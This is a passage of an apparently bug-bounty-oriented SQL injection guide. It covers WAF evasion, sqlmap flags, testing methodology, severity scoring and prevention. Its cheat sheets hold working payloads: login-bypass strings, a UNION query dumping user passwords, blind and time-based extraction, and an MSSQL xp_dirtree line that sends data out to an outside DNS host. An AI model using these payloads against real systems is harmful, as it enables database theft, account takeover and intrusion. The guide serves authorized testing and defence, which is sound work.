Use no-quote string literals: MySQL hex `0x61646d696e` = `'admin'`; `CHAR(65,66)` / `CHR(65)` on the various engines; concatenated char codes `CHR(65)||CHR(66)` (PG/Oracle/SQLite), `CHAR(65)+CHAR(66)` (MSSQL). For comparisons without `=`, use `LIKE`, `<>`, `BETWEEN`, `IN`, or `>`/`<`.

### Q78. How do encoding and double-encoding help?
URL-encode metacharacters (`%27` for `'`), or **double-encode** (`%2527`) when one decode layer happens before the value reaches the query and the WAF only inspects the once-decoded form. Some stacks decode twice. Also try mixing encodings (URL + HTML entity) and Unicode/overlong forms where the DB normalizes but the WAF doesn't.

### Q79. What's HTTP Parameter Pollution (HPP) and how does it bypass filters?
Sending a parameter twice (`id=1&id=2`) — different stacks take the first, the last, or **concatenate** them. Where the backend concatenates duplicated params, you can split a blocked payload across both copies so neither individually trips the WAF, but the assembled query is malicious. Test which value the app uses, then split accordingly.

### Q80. How do I attack an ORM-backed app that "uses parameterized queries"?
Hunt the **escape hatches**: raw fragments (`knex.raw`, `sequelize.literal`, `.extra()`, `find_by_sql`, `String.format` into SQL) and the **identifier slots** ORMs don't parameterize — the **sort column** (`order(params[:sort])`), table/column names, `LIMIT`. Values may be safe while the sort column is concatenated raw. Also test **second-order** paths the ORM never re-escapes.

### Q81. Time-based payload is blocked or response-diff is normalized — now what?
If the WAF/CDN normalizes the boolean response difference (caching, fixed templates), a **time** delay usually still leaks (it's a side effect of execution, not the body). If `SLEEP` is filtered, try heavy-computation alternatives (MySQL `BENCHMARK`, repeated hashing) or **OOB**. If `WAITFOR` is filtered on MSSQL, a heavy `OPENQUERY`/cross-join can introduce delay. OOB is the ultimate fallback.

### Q82. What advanced tricks help against strict filters?
Scientific notation and odd numeric forms (`1.0e1`, `0x1`); whitespace-free logic (`OR/**/1=1`); attribute/keyword aliasing; conditional comments; nesting subqueries to avoid blocked top-level keywords; using engine-specific syntax the WAF's grammar doesn't model (`/*!…*/`, Oracle `q'[…]'` quoting, PG dollar-quoting `$$…$$`). The principle: find a representation the **DB** accepts but the **WAF** doesn't model.

---

# TOOLING

### Q83. How should I use `sqlmap` responsibly?
**After** hand-confirming the bug. Feed it a saved Burp request (`-r req.txt -p <param>`) so it replays exact state. Start gentle (`--level 2 --risk 1`), pick the technique/DBMS explicitly to reduce noise, and enumerate **without** mass-dumping (`--banner --current-user --current-db --is-dba`, `--tables`, one-column reads). See `poc/sqlmap_cheat.md`.

### Q84. What sqlmap flags are dangerous on production?
`--risk 3` enables **stacked-query writes** (it may `UPDATE`/`INSERT`). `--dump`/`--dump-all` exfiltrates real data. `--os-shell`/`--os-pwn` drops an interactive shell / runs Metasploit. On a bounty, avoid all of these — use `--os-cmd "whoami"` (one benign command) at most, and one-row reads for proof. Route sqlmap through Burp (`--proxy`) so you can copy the exact winning request into your report.

### Q85. What do `poc/sqli_fuzz.py` and `poc/sqli_blind.py` do?
`sqli_fuzz.py` probes a `FUZZ`/named param across the families — error-based (+ DBMS fingerprint), boolean (with a stability re-check), time (`SLEEP` vs `SLEEP(0)`), UNION column-count via `ORDER BY`, and auth-bypass — and guesses the engine. `sqli_blind.py` reads a scalar sub-query **char-by-char** via a boolean (response-diff) or time (delay) oracle, binary-searching each character, with per-DBMS substring/sleep helpers.

### Q86. Why "manual-first, tool-second"?
Triagers reject "sqlmap flagged it" with no hand proof, and unbounded tool runs are loud and can corrupt data. You must reproduce the **context**, the **DBMS**, and a **controlled query change** yourself. Tools then *characterize* the bug (version, schema) faster — but the report stands on your hand-reproduced PoC, not the tool's say-so.

### Q87. What's a good supporting toolset?
Burp (Repeater/Intruder/Comparer, Collaborator for OOB), `sqlmap` and `ghauri` (alternative engine for stubborn blind/time), `ffuf`/Intruder for column-count and charset sweeps, `nuclei -tags sqli` for first-pass discovery (verify by hand), and `hashcat` for offline cracking of dumped hashes (authorized red-team only).

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q88. Give me the end-to-end black-box methodology.
**Recon** every input reaching SQL → **baseline** (`'` `"` `)` arithmetic `2-1`) and decide **context** → **detect** in order (error+fingerprint → boolean → time → UNION → OOB → stacked) → **escalate** to the highest impact (RCE → auth bypass → dump → file R/W → privesc → second-order) → **evade** the WAF if needed → **validate** (FP filter) → **report** with benign, bounded proof. (Guide Master Testing Sequence.)

### Q89. What's the per-sink checklist in one breath?
Context (string/numeric/identifier)? DBMS? Channel (error/UNION/boolean/time/OOB)? Stacked? Privilege (DBA/superuser/FILE)? Then: can I bypass auth / read the DB / read a file / write a file / run a command / move laterally / is there a second-order consumer? Prove **one** highest impact benignly, then stop. (See `SQL_INJECTION_CHECKLIST.md`.)

### Q90. How do I prioritize which parameters to test first?
Highest-signal first: **login** (auth bypass), numeric `?id=` (cleanest detection), `?sort=`/`?order=` (identifier — often missed), free-text **search/filter**, **export/report** builders, and logged **headers** (second-order). Anything described as "use your … credentials" or that obviously hits a DB lookup is a priority.

### Q91. How do I test JSON / GraphQL / header / cookie injection points?
Same logic, different placement: put the payload in the **JSON value** (mind the surrounding quotes/escaping), the **GraphQL arg/variable**, the **header** value (`X-Forwarded-For: 1' AND SLEEP(5)-- -`), or the **cookie** sub-field. sqlmap can parse JSON and target headers/cookies (`--headers`, `--cookie`, mark the point with `*`). Blind/time/OOB shine here since these sinks rarely reflect data.

---

# SEVERITY, VALIDITY & FALSE POSITIVES

### Q92. How do triagers rate SQLi severity?
RCE on the DB host → **Critical** (~10.0). Auth bypass → admin (ATO) → **Critical** (~9.x). Arbitrary DB read incl. hashes/PII at scale → **High–Critical**. File read → **High** (pivots). File write→shell → **Critical**. Blind read of non-cred data → **High**. Reflected error / lone 500 with no query change → **Low (info)** at best. Anchor to **CWE-89** (+287/78 for auth/RCE).

### Q93. What's the CVSS vector for a typical read-only SQLi?
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` ≈ **7.5 (High)** for unauthenticated arbitrary read. Raise `I` if you can write, raise to `S:C` and `A:H` for RCE (→ ~10.0), and add **CWE-287** for auth bypass / **CWE-78** for OS-command RCE.

### Q94. What are the top SQLi false positives to never report?
A `'` causing a 500/stack trace (a crash, not control); a reflected SQL error string (info leak, not injection); a one-off length blip (jitter/caching); "sqlmap flagged it" with no hand proof; a slow endpoint mislabeled "time-based"; parameterized-ORM input that's merely reflected; NoSQL `$ne`/`$gt` behavior; and any **destructive** "proof" (a DROP/DELETE that ran).

### Q95. How do I prove a finding is real and not jitter/caching?
Re-test boolean/time oracles several times and confirm the difference is **stable** and **tracks your payload** (vary the sleep value; confirm TRUE/FALSE reproduce). Tie the change to the **specific** payload (control requests behave differently). Reproduce **by hand**, not just via a tool. Stability + payload-correlation is what separates a real oracle from noise.

### Q96. How do I de-duplicate SQLi findings?
One **query/sink** = one finding even if reachable via several params or several techniques (boolean *and* UNION on the same query is one bug). Lead with the **highest** impact (RCE > auth bypass > read). **Distinct sinks** (login vs search vs `?sort=`) = distinct reports. If one code path is reached via many parameters, report once and list them.

---

# CHEAT SHEETS

### Q97. Detection cheat.
```
'  "  )            break string/paren contexts (error?)
2-1               numeric context (returns row 1?)
AND 1=1 / AND 1=2  boolean oracle (different responses?)
AND SLEEP(5)       time blind (delays? → MySQL)
' ORDER BY N-- -   UNION column count (errors at N ⇒ N-1 cols)
' UNION SELECT NULL,..  exact column count (no type error)
```

### Q98. Per-DBMS one-liner cheat.
```
              version     concat  comment   sleep                 stacked  RCE
MySQL         @@version   CONCAT  -- - / #   SLEEP(5)              no*      UDF / INTO OUTFILE webshell
PostgreSQL    version()   ||      --         pg_sleep(5)           YES      COPY..FROM PROGRAM
MSSQL         @@version   +       --         WAITFOR DELAY '0:0:5' YES      xp_cmdshell / linked srv
Oracle        v$version   ||      --         DBMS_PIPE.RECEIVE..   ltd      DBMS_SCHEDULER / Java
SQLite        sqlite_version() || --         (none)                some     (none)
```

### Q99. Extraction cheat.
```
SCHEMA   information_schema.tables/.columns  | Oracle all_tables/all_tab_columns | SQLite sqlite_master
READ     ' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users-- -
BLIND    ' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -   (binary search)
TIME     ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(5),0)-- -
TOOL     python3 poc/sqli_blind.py -u … --inject id --mode boolean --true "<marker>" --dbms mysql --extract "select database()"
```

### Q100. Auth-bypass + evasion cheat.
```
AUTH     admin'-- -   ' OR '1'='1'-- -   ' OR 1=1 LIMIT 1-- -   ") OR ("1"="1
EVADE    UN/**/ION  /*!50000SELECT*/  uNiOn  0x61646d696e(=admin)  CHAR(65)  =→LIKE  space→/**/  %2527(double)
TIME>BOOL when response-diff is normalized, a SLEEP delay still leaks
OOB      '; EXEC master..xp_dirtree '\\'+(SELECT @@version)+'.collab\x'-- -   (MSSQL DNS)
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q101. What real-world apps/surfaces have shown SQLi, and any notable cases?
Login forms (`WHERE user='$u' AND pass='$p'`), `?id=`/search/filter/`?sort=` params, headers logged to audit tables, report/export builders, and ORM raw escape hatches. Notable cases (verify details before citing): **MOVEit Transfer CVE-2023-34362** (pre-auth SQLi→RCE, mass-exploited by Cl0p, 2023); **Accellion FTA CVE-2021-27101** (Cl0p); **Drupalgeddon CVE-2014-3704** (pre-auth Drupal 7 SQLi); **Joomla! CVE-2017-8917**; **Magento CVE-2019-7139**; historic breaches **Heartland (2008)**, **Sony Pictures (2011, LulzSec)**, **Yahoo Voices (2012, ~450k creds, union-based)**, **TalkTalk (2015)**.

### Q102. What are the must-read references?
PortSwigger's *SQL injection* topic + cheat sheet + labs (the best hands-on resource), OWASP's *SQL Injection* page, **WSTG-INPV-05**, the OWASP *SQL Injection Prevention Cheat Sheet*, PayloadsAllTheThings *SQL Injection*, HackTricks *SQL injection* (+ per-DBMS pages), and the `sqlmap` docs. CWE-89/74/287/78 for severity anchoring.

### Q103. How do I keep current on this class?
SQLi fundamentals are stable, so "updates" are mostly **new sinks** (a product's SQLi CVE), **WAF-bypass research**, and **engine features** that change the RCE/file ceiling. Follow product SQLi advisories (especially "pre-auth SQLi → RCE" in file-transfer/edge appliances like the MOVEit/Accellion class), the PayloadsAllTheThings repo, and PortSwigger research.

---

# DEFENSE — PREVENTING SQL INJECTION

### Q104. What's the single most effective fix?
**Parameterized queries / prepared statements everywhere** — bind variables (`?`, `$1`, `:name`) so user input is always *data*, never *code*. This neutralizes every payload in this document for value contexts. Never build SQL by string concatenation or interpolation, in any language or ORM.

### Q105. How do I safely handle things parameters can't bind (sort column, table name)?
Identifiers (column/table names, `ASC`/`DESC`, `LIMIT` in some drivers) **cannot** be parameterized. **Allowlist** them against a fixed set of known, valid values server-side (map `sort=price` → the literal column `price`, reject anything else). Never pass a request-supplied identifier into the query, even "escaped."

### Q106. Does input validation/escaping replace parameterization?
No. **Validation/allowlisting is defense-in-depth, not a substitute.** Hand-rolled escaping is error-prone (charset issues, second-order, missed contexts) and WAFs are bypassable. Use parameterized queries as the **primary** control; add input validation (expected type/charset) and a WAF as additional layers.

### Q107. How do I implement login securely against SQLi?
Look up the user with a **parameterized** query, then verify the password **server-side** with a constant-time hash comparison (bcrypt/argon2). Never treat "a row was returned" as authenticated, and never put the password into the query. This makes auth-bypass injection ineffective even if a query were injectable.

### Q108. What least-privilege hardening limits the blast radius?
Run the app on a **least-privilege DB account**: no `FILE`/superuser/`sysadmin`/`xp_cmdshell`, separate read-only vs write users per function, no access to system tables/linked servers it doesn't need. Then even a successful injection can't read files, write a webshell, run commands, or move laterally — turning a would-be Critical into a contained read.

### Q109. What else hardens the data layer?
**Disable verbose DB errors** in production (kills error-based extraction and fingerprinting), **disable dangerous features** (`xp_cmdshell`, `COPY…FROM PROGRAM`, UDF creation, `local_infile`) unless required, restrict `secure_file_priv` (MySQL), monitor/alert on DB errors and anomalous query volume, and put a **WAF** in front as a speed bump (not the primary control).

### Q110. Give me the defender's one-paragraph summary.
Treat every value entering SQL as hostile: use **parameterized queries** everywhere so input is always data; for identifiers that can't bind, **allowlist** against known values. Implement login as parameterized lookup + **server-side constant-time hash compare**, never "a row matched." Add input validation and a WAF as **defense-in-depth**, not the main control. Then **minimize blast radius**: a **least-privilege** DB account with no file/superuser/command features, disabled dangerous functions, suppressed verbose errors, and anomaly monitoring. Do that and the entire attack tree here — auth bypass, dump, file R/W, RCE, blind/OOB extraction, stacked and second-order — collapses to a contained, low-value event.

---

> **Final word:** SQL injection is the one web bug that still ends in *total* compromise — read the whole database, log in as admin, read and write files, and run commands on the DB host. Detect it by proving the **query did something different** (other rows / a TRUE-FALSE branch / a controlled delay / a UNION value / a DNS callback), nail the **context** and the **engine** so the arsenal becomes copy-paste, escalate to the **highest** impact the privileges allow — then prove it **once, benignly** (`version()` + one row, a single `whoami` line) and **stop**. Authorized targets only, and **never** run a destructive write.
